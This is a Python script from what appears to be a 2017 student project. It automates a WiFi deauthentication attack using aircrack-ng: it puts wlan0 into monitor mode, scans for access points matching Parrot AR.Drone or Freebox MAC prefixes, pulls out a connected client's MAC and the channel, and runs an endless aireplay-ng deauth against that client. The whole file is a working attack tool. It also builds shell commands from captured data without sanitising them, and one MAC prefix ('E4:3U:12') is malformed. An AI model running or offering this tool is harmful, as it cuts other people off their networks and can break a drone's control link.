import os
import subprocess
import time
import signal

'''
Auto-deauth clients from an AP using the aircrack-ng suite.
By P.Desigaud
@ INSA Lyon, TC department, OP4 Project, 2017
'''

def create_interface():
  print('Creating monitoring interface on wlan0...')
  os.system("airmon-ng start wlan0")

def prepare_environment():
  print('Preparing a sane environment...')
  os.system("rfkill unblock all")
  os.system("airmon-ng check kill")

def clear_bin():
    files_list = os.listdir("./bin")
    for file in files_list:
        os.remove('./bin/'+file)

def dump_wifi(timeout=30,output_file="output",regex_AP="^."):
  print('Dumping WiFi networks...')
  airodump_cmd = "airodump-ng --essid-regex "+regex_AP+" wlan0mon -w "+output_file
  # --channel 1
  #^ardrone
  pro = subprocess.Popen(airodump_cmd, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
  time.sleep(timeout)
  #  Send the signal to all the process groups
  os.killpg(os.getpgid(pro.pid), signal.SIGTERM)

def set_interface_channel(channel):
    print("Setting interface on channel "+str(channel)+"...")
    os.system('iwconfig wlan0mon channel '+str(channel))

def deauth_clients(AP_MAC,station_MAC):
  print("Deauthenticating client "+station_MAC+" from "+AP_MAC+"...")
  os.system('aireplay-ng --deauth 0 -a '+AP_MAC+' -c '+station_MAC+' wlan0mon')

def extract_infos(file,possible_AP_MACs,ignore_MAC=''):

    infos = {}
    infos['ERROR'] = True
    splitted_line = {}
    file_data = open(file+'-01.csv', 'r').readlines()

    for line in file_data:
        for mac in possible_AP_MACs:

            # First we seek the AP MAC
            if(line.startswith(mac)):
                splitted_line = line.split(' ')
                infos['APMAC'] = splitted_line[0][:17]
                infos['CH'] = splitted_line[6]

            # Then we seek the clients MAC
            elif('APMAC' in infos.keys()):
                splitted_line = line.split(' ')
                # If MAC dest = target AP MAC
                if(len(splitted_line)>=12 and splitted_line[12][:17]==infos['APMAC'] and splitted_line[12][:17]!=ignore_MAC):
                    # We take the source MAC
                    infos['STMAC'] = splitted_line[0][:17]
                    infos['ERROR'] = False

    return infos

if __name__=='__main__':

    # From https://www.adminsub.net/mac-address-finder/
    possible_MACs_freebox = ['E4:3U:12','E4:9E:12']
    possible_MACs_parrot = ['A0:14:3D','90:3A:E6','90:03:B7','00:26:7E','00:12:1C']
    prefix_AP = 'ardrone' #Can be empty

    # Must be high in a high-network-density space
    dumping_timeout = 20

    # Do not deauth myself :p
    my_MAC_adress = 'B8:8A:60:BD:86:DE'

    create_interface()
    prepare_environment()
    clear_bin()
    dump_wifi(regex_AP=prefix_AP,output_file="./bin/out", timeout=dumping_timeout)

  # read MACs, channel from out file
    connections_info = extract_infos("./bin/out",possible_MACs_parrot,ignore_MAC=my_MAC_adress)

    if(connections_info['ERROR']):
        print("Error - Nothing found with the provided MACs and ESSID.")
        print("Try to set a bigger dumping_timeout.")
        exit()

    AP_MAC      = connections_info['APMAC']
    station_MAC   = connections_info['STMAC']
    channel_number  = connections_info['CH']

    print("EXTRACTED INFOS:")
    print(AP_MAC)
    print(channel_number)

    set_interface_channel(channel_number)
    deauth_clients(AP_MAC,station_MAC)

    exit()
